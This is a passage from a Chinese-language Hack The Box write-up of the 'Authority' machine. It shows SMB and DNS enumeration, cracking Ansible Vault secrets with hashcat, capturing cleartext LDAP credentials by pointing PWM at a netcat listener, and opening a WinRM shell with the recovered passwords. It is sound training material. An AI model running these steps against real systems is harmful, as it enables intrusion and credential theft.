+<h2 id="DNS-TCP-x2F-UDP-53"><a href="#DNS-TCP-x2F-UDP-53" class="headerlink" title="DNS - TCP &#x2F; UDP 53"></a>DNS - TCP &#x2F; UDP 53</h2><p>TCP 53端口开放，尝试在SMB枚举标识的域上进行zone transfer:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  dig axfr authority.htb @10.10.11.222</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.19.17-1-Debian &lt;&lt;&gt;&gt; axfr authority.htb @10.10.11.222</span><br><span class="line">;; global options: +cmd</span><br><span class="line">; Transfer failed.</span><br></pre></td></tr></table></figure>
+
+<p>不允许Zone transfers。</p>
+<p>反向查找也不会得到任何有用的信息:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  dig -x 10.10.11.222 @10.10.11.222</span><br><span class="line">;; communications error to 10.10.11.222<span class="comment">#53: timed out</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.19.17-1-Debian &lt;&lt;&gt;&gt; -x 10.10.11.222 @10.10.11.222</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- <span class="string">opcode: QUERY, status: SERVFAIL, id: 54962</span></span><br><span class="line"><span class="string">;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; OPT PSEUDOSECTION:</span></span><br><span class="line"><span class="string">; EDNS: version: 0, flags:; udp: 4000</span></span><br><span class="line"><span class="string">;; QUESTION SECTION:</span></span><br><span class="line"><span class="string">;222.11.10.10.in-addr.arpa.     IN      PTR</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; Query time: 3992 msec</span></span><br><span class="line"><span class="string">;; SERVER: 10.10.11.222#53(10.10.11.222) (UDP)</span></span><br><span class="line"><span class="string">;; WHEN: Mon Dec 11 07:31:55 EST 2023</span></span><br><span class="line"><span class="string">;; MSG SIZE  rcvd: 54</span></span><br></pre></td></tr></table></figure>
+
+<p>将以下域名添加到&#x2F;etc&#x2F;hosts</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.222    authority.authority.htb authority.htb</span><br></pre></td></tr></table></figure>
+
+<h2 id="Website-TCP-80"><a href="#Website-TCP-80" class="headerlink" title="Website - TCP 80"></a>Website - TCP 80</h2><p>iis界面没有任何东西</p>
+<h2 id="PWM-TCP-8443"><a href="#PWM-TCP-8443" class="headerlink" title="PWM - TCP 8443"></a>PWM - TCP 8443</h2><p>web root重定向到&#x2F;pwm&#x2F;，呈现一个<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B3bS1wcm9qZWN0L3B3bQ==">pwm<i class="fa fa-external-link-alt"></i></span>界面:</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority1.png"></p>
+</li>
+<li><p>PWM: 一个用于LDAP目录的开源密码自助服务应用程序。</p>
+</li>
+</ul>
+<h1 id="Shell-as-svc-ldap"><a href="#Shell-as-svc-ldap" class="headerlink" title="Shell as svc_ldap"></a>Shell as svc_ldap</h1><h2 id="Ansible-文件"><a href="#Ansible-文件" class="headerlink" title="Ansible 文件"></a>Ansible 文件</h2><p>SMB共享中的一个目录命名为PWM:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">smb: \Automation\Ansible\PWM\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Fri Mar 17 09:20:48 2023</span><br><span class="line">  ..                                  D        0  Fri Mar 17 09:20:48 2023</span><br><span class="line">  ansible.cfg                         A      491  Thu Sep 22 01:36:58 2022</span><br><span class="line">  ansible_inventory                   A      174  Wed Sep 21 18:19:32 2022</span><br><span class="line">  defaults                            D        0  Fri Mar 17 09:20:48 2023</span><br><span class="line">  handlers                            D        0  Fri Mar 17 09:20:48 2023</span><br><span class="line">  meta                                D        0  Fri Mar 17 09:20:48 2023</span><br><span class="line">  README.md                           A     1290  Thu Sep 22 01:35:58 2022</span><br><span class="line">  tasks                               D        0  Fri Mar 17 09:20:48 2023</span><br><span class="line">  templates                           D        0  Fri Mar 17 09:20:48 2023</span><br><span class="line"></span><br><span class="line">                5888511 blocks of size 4096. 1145489 blocks available</span><br></pre></td></tr></table></figure>
+
+<p>把这些文件下载下来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">smb: \Automation\Ansible\&gt; prompt off</span><br><span class="line">smb: \Automation\Ansible\&gt; recurse <span class="literal">true</span></span><br><span class="line">smb: \Automation\Ansible\&gt; mget PWM</span><br><span class="line">getting file \Automation\Ansible\PWM\ansible.cfg of size 491 as PWM/ansible.cfg (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)</span><br><span class="line">getting file \Automation\Ansible\PWM\ansible_inventory of size 174 as PWM/ansible_inventory (0.1 KiloBytes/sec) (average 0.3 KiloBytes/sec)</span><br><span class="line">getting file \Automation\Ansible\PWM\README.md of size 1290 as PWM/README.md (1.0 KiloBytes/sec) (average 0.5 KiloBytes/sec)</span><br><span class="line">getting file \Automation\Ansible\PWM\defaults\main.yml of size 1591 as PWM/defaults/main.yml (1.6 KiloBytes/sec) (average 0.8 KiloBytes/sec)</span><br><span class="line">getting file \Automation\Ansible\PWM\handlers\main.yml of size 4 as PWM/handlers/main.yml (0.0 KiloBytes/sec) (average 0.7 KiloBytes/sec)</span><br><span class="line">getting file \Automation\Ansible\PWM\meta\main.yml of size 199 as PWM/meta/main.yml (0.2 KiloBytes/sec) (average 0.6 KiloBytes/sec)</span><br><span class="line">getting file \Automation\Ansible\PWM\tasks\main.yml of size 1832 as PWM/tasks/main.yml (1.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)</span><br><span class="line">getting file \Automation\Ansible\PWM\templates\context.xml.j2 of size 422 as PWM/templates/context.xml.j2 (0.4 KiloBytes/sec) (average 0.7 KiloBytes/sec)</span><br><span class="line">getting file \Automation\Ansible\PWM\templates\tomcat-users.xml.j2 of size 388 as PWM/templates/tomcat-users.xml.j2 (0.5 KiloBytes/sec) (average 0.7 KiloBytes/sec)</span><br></pre></td></tr></table></figure>
+
+<p>ansible_inventory 文件似乎有WinRM的密码</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority2.png"></li>
+</ul>
+<p>用netexec尝试:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  netexec winrm authority.htb -u administrator -p <span class="string">&#x27;Welcome1&#x27;</span></span><br><span class="line">SMB         10.10.11.222    5985   AUTHORITY        [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)</span><br><span class="line">HTTP        10.10.11.222    5985   AUTHORITY        [*] http://10.10.11.222:5985/wsman</span><br><span class="line">HTTP        10.10.11.222    5985   AUTHORITY        [-] authority.htb\administrator:Welcome1</span><br></pre></td></tr></table></figure>
+
+<p>\Automation\Ansible\PWM\defaults\main.yml有PWM的配置文件:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">pwm_run_dir: <span class="string">&quot;&#123;&#123; lookup(&#x27;env&#x27;, &#x27;PWD&#x27;) &#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">pwm_hostname: authority.htb.corp</span><br><span class="line">pwm_http_port: <span class="string">&quot;&#123;&#123; http_port &#125;&#125;&quot;</span></span><br><span class="line">pwm_https_port: <span class="string">&quot;&#123;&#123; https_port &#125;&#125;&quot;</span></span><br><span class="line">pwm_https_enable: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">pwm_require_ssl: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">pwm_admin_login: !vault |</span><br><span class="line">          <span class="variable">$ANSIBLE_VAULT</span>;1.1;AES256</span><br><span class="line">          32666534386435366537653136663731633138616264323230383566333966346662313161326239</span><br><span class="line">          6134353663663462373265633832356663356239383039640a346431373431666433343434366139</span><br><span class="line">          35653634376333666234613466396534343030656165396464323564373334616262613439343033</span><br><span class="line">          6334326263326364380a653034313733326639323433626130343834663538326439636232306531</span><br><span class="line">          3438</span><br><span class="line"></span><br><span class="line">pwm_admin_password: !vault |</span><br><span class="line">          <span class="variable">$ANSIBLE_VAULT</span>;1.1;AES256</span><br><span class="line">          31356338343963323063373435363261323563393235633365356134616261666433393263373736</span><br><span class="line">          3335616263326464633832376261306131303337653964350a363663623132353136346631396662</span><br><span class="line">          38656432323830393339336231373637303535613636646561653637386634613862316638353530</span><br><span class="line">          3930356637306461350a316466663037303037653761323565343338653934646533663365363035</span><br><span class="line">          6531</span><br><span class="line"></span><br><span class="line">ldap_uri: ldap://127.0.0.1/</span><br><span class="line">ldap_base_dn: <span class="string">&quot;DC=authority,DC=htb&quot;</span></span><br><span class="line">ldap_admin_password: !vault |</span><br><span class="line">          <span class="variable">$ANSIBLE_VAULT</span>;1.1;AES256</span><br><span class="line">          63303831303534303266356462373731393561313363313038376166336536666232626461653630</span><br><span class="line">          3437333035366235613437373733316635313530326639330a643034623530623439616136363563</span><br><span class="line">          34646237336164356438383034623462323531316333623135383134656263663266653938333334</span><br><span class="line">          3238343230333633350a646664396565633037333431626163306531336336326665316430613566</span><br><span class="line">          3764</span><br></pre></td></tr></table></figure>
+
+<h2 id="恢复密码"><a href="#恢复密码" class="headerlink" title="恢复密码"></a>恢复密码</h2><p>上面文件中的值由<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmFuc2libGUuY29tL2Fuc2libGUvMi44L3VzZXJfZ3VpZGUvdmF1bHQuaHRtbCN2YXJpYWJsZS1sZXZlbC1lbmNyeXB0aW9u">Ansible Vault<i class="fa fa-external-link-alt"></i></span>保护。John The Ripper有一个脚本<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL29wZW53YWxsL2pvaG4vYmxvYi9ibGVlZGluZy1qdW1iby9ydW4vYW5zaWJsZTJqb2huLnB5">ansible2john.py<i class="fa fa-external-link-alt"></i></span>。该脚本接受一个有两行的文件，第一行是头，第二行是上面十六进制编码的值。把这三个受保护的值格式化成文件:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@kali  ~/hackthebox/machine/authority  <span class="built_in">cat</span> vault*</span><br><span class="line"><span class="variable">$ANSIBLE_VAULT</span>;1.1;AES256</span><br><span class="line">32666534386435366537653136663731633138616264323230383566333966346662313161326239</span><br><span class="line">6134353663663462373265633832356663356239383039640a346431373431666433343434366139</span><br><span class="line">35653634376333666234613466396534343030656165396464323564373334616262613439343033</span><br><span class="line">6334326263326364380a653034313733326639323433626130343834663538326439636232306531</span><br><span class="line">3438</span><br><span class="line"><span class="variable">$ANSIBLE_VAULT</span>;1.1;AES256</span><br><span class="line">31356338343963323063373435363261323563393235633365356134616261666433393263373736</span><br><span class="line">3335616263326464633832376261306131303337653964350a363663623132353136346631396662</span><br><span class="line">38656432323830393339336231373637303535613636646561653637386634613862316638353530</span><br><span class="line">3930356637306461350a316466663037303037653761323565343338653934646533663365363035</span><br><span class="line">6531</span><br><span class="line"><span class="variable">$ANSIBLE_VAULT</span>;1.1;AES256</span><br><span class="line">63303831303534303266356462373731393561313363313038376166336536666232626461653630</span><br><span class="line">3437333035366235613437373733316635313530326639330a643034623530623439616136363563</span><br><span class="line">34646237336164356438383034623462323531316333623135383134656263663266653938333334</span><br><span class="line">3238343230333633350a646664396565633037333431626163306531336336326665316430613566</span><br><span class="line">3764</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9wcG4uc25vdnZjcmFzaC5yb2Nrcy9wZW50ZXN0L2luZnJhc3RydWN0dXJlL2Rldm9wcy9hbnNpYmxl">ansible hash crack<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>运行ansible2john.py来生成hash:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  /usr/share/john/ansible2john.py vault1 vault2 vault3 | <span class="built_in">tee</span> vault_hashes</span><br><span class="line">vault1:$ansible<span class="variable">$0</span>*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8</span><br><span class="line">vault2:$ansible<span class="variable">$0</span>*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5</span><br><span class="line">vault3:$ansible<span class="variable">$0</span>*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635</span><br></pre></td></tr></table></figure>
+
+<p>使用hashcat 16900模式破解以上hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">E:\hashcat-6.2.5&gt;hashcat.exe -m 16900 password.txt rockyou.txt</span><br><span class="line">hashcat (v6.2.5) starting</span><br><span class="line"></span><br><span class="line">$ansible<span class="variable">$0</span>*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed228                                                                                                           809393b1767055a66deae678f4a8b1f8550905f70da5:!@<span class="comment">#$%^&amp;*</span></span><br><span class="line">$ansible<span class="variable">$0</span>*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c                                                                                                           c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@<span class="comment">#$%^&amp;*</span></span><br><span class="line">$ansible<span class="variable">$0</span>*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73a                                                                                                           ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@<span class="comment">#$%^&amp;*</span></span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 16900 (Ansible Vault)</span><br><span class="line">Hash.Target......: password.txt</span><br><span class="line">Time.Started.....: Mon Dec 11 14:40:10 2023 (8 secs)</span><br><span class="line">Time.Estimated...: Mon Dec 11 14:40:18 2023 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:   163.1 kH/s (7.49ms) @ Accel:32 Loops:32 Thr:256 Vec:1</span></span><br><span class="line">Speed.<span class="comment">#3.........:     4998 H/s (9.29ms) @ Accel:64 Loops:16 Thr:16 Vec:1</span></span><br><span class="line">Speed.<span class="comment">#*.........:   168.1 kH/s</span></span><br><span class="line">Recovered........: 3/3 (100.00%) Digests, 3/3 (100.00%) Salts</span><br><span class="line">Progress.........: 1245184/43033158 (2.89%)</span><br><span class="line">Rejected.........: 0/1245184 (0.00%)</span><br><span class="line">Restore.Point....: 0/14344386 (0.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:2 Amplifier:0-1 Iteration:9984-9999</span></span><br><span class="line">Restore.Sub.<span class="comment">#3...: Salt:2 Amplifier:0-1 Iteration:1136-1152</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#1....: eatme1 -&gt; columb</span></span><br><span class="line">Candidates.<span class="comment">#3....: 123456 -&gt; elenutza</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: Temp: 53c Util: 98% Core:1515MHz Mem:6000MHz Bus:8</span></span><br><span class="line">Hardware.Mon.<span class="comment">#3..: N/A</span></span><br></pre></td></tr></table></figure>
+
+<p>它们都有相同的密码!@#$%^&amp;*，这是有意义的，因为它们是在同一个可见文件中加密的。</p>
+<p>使用ansible-vault破解得到明文密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install ansible-vault</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@kali  ~/hackthebox/machine/authority  <span class="built_in">cat</span> vault1 | ansible-vault decrypt</span><br><span class="line">Vault password:</span><br><span class="line">Decryption successful</span><br><span class="line">svc_pwm</span><br><span class="line">⚡ root@kali  ~/hackthebox/machine/authority  <span class="built_in">cat</span> vault2 | ansible-vault decrypt</span><br><span class="line">Vault password:</span><br><span class="line">Decryption successful</span><br><span class="line">pWm_@dm!N_!23</span><br><span class="line">⚡ root@kali  ~/hackthebox/machine/authority  <span class="built_in">cat</span> vault3 | ansible-vault decrypt</span><br><span class="line">Vault password:</span><br><span class="line">Decryption successful</span><br><span class="line">DevT3st@123</span><br></pre></td></tr></table></figure>
+
+<p>尝试密码有效性</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  netexec smb authority.htb -u svc_pwm -p <span class="string">&#x27;pWm_@dm!N_!23&#x27;</span></span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_pwm:pWm_@dm!N_!23</span><br><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  netexec smb authority.htb -u svc_pwm -p <span class="string">&#x27;pWm_@dm!N_!23&#x27;</span> --shares</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_pwm:pWm_@dm!N_!23</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        [-] Error enumerating shares: STATUS_ACCESS_DENIED</span><br><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  netexec winrm authority.htb -u svc_pwm -p <span class="string">&#x27;pWm_@dm!N_!23&#x27;</span></span><br><span class="line">SMB         10.10.11.222    5985   AUTHORITY        [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)</span><br><span class="line">HTTP        10.10.11.222    5985   AUTHORITY        [*] http://10.10.11.222:5985/wsman</span><br><span class="line">HTTP        10.10.11.222    5985   AUTHORITY        [-] authority.htb\svc_pwm:pWm_@dm!N_!23</span><br><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  netexec ldap 10.10.11.222 -u svc_pwm -p <span class="string">&#x27;pWm_@dm!N_!23&#x27;</span></span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        10.10.11.222    445    AUTHORITY        [-] Error <span class="keyword">in</span> searchRequest -&gt; operationsError: 000004DC: LdapErr: DSID-0C090ACD, comment: In order to perform this operation a successful <span class="built_in">bind</span> must be completed on the connection., data 0, v4563</span><br><span class="line">LDAPS       10.10.11.222    636    AUTHORITY        [+] authority.htb\svc_pwm:pWm_@dm!N_!23</span><br></pre></td></tr></table></figure>
+
+<p>回到PWM登录面板，可以使用密码pWm_@dm!N_! 23登录到Configuration Editor</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority3.png"></li>
+</ul>
+<h2 id="抓取-LDAP-Creds"><a href="#抓取-LDAP-Creds" class="headerlink" title="抓取 LDAP Creds"></a>抓取 LDAP Creds</h2><p>存储了一些缓存凭据。为了恢复它们，编辑URL以指向本机ip，使用明文LDAP而不是LDAPS(并使用默认的LDAP端口389)，编辑好后然后点击”Test LDAP Profile”:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">luci@luci$ nc -lnvp 389</span><br><span class="line">Listening on 0.0.0.0 389</span><br><span class="line">Connection received on 10.10.11.222 61956</span><br><span class="line">0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htblDaP_1n_th3_cle4r!</span><br></pre></td></tr></table></figure>
+
+<p>密码为”lDaP_1n_th3_cle4r!”，尽管在该捕获中看到它不是微不足道的，因为终端只是丢弃了该数据中的非ascii字符。在Wireshark中看的更清楚:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority4.png"></li>
+</ul>
+<p>Authority作为客户端试图向我的VM进行身份验证，并以明文发送这些凭证。<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xnYW5keC9SZXNwb25kZXI=">Responder<i class="fa fa-external-link-alt"></i></span>也可以监听并捕获这些信号:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Listening <span class="keyword">for</span> events...</span><br><span class="line"></span><br><span class="line">[LDAP] Cleartext Client   : 10.10.11.222</span><br><span class="line">[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb</span><br><span class="line">[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!</span><br></pre></td></tr></table></figure>
+
+<h2 id="WinRM-shell"><a href="#WinRM-shell" class="headerlink" title="WinRM shell"></a>WinRM shell</h2><p>这些creds在SMB和WinRM上的svc_ldap帐户都有效:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  netexec smb authority.htb -u svc_ldap -p <span class="string">&#x27;lDaP_1n_th3_cle4r!&#x27;</span></span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!</span><br><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  netexec winrm authority.htb -u svc_ldap -p <span class="string">&#x27;lDaP_1n_th3_cle4r!&#x27;</span></span><br><span class="line">SMB         10.10.11.222    5985   AUTHORITY        [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)</span><br><span class="line">HTTP        10.10.11.222    5985   AUTHORITY        [*] http://10.10.11.222:5985/wsman</span><br><span class="line">HTTP        10.10.11.222    5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)</span><br></pre></td></tr></table></figure>
+
+<p>直接使用密码获取WinRM shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  evil-winrm -i authority.htb -u svc_ldap -p <span class="string">&#x27;lDaP_1n_th3_cle4r!&#x27;</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_ldap\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">htb\svc_ldap</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_ldap\Documents&gt; <span class="built_in">cat</span> C:\Users\svc_ldap\desktop\user.txt</span><br><span class="line">9e33396f8c7903dea494cfba76cbc503</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority5.png"></li>
+</ul>
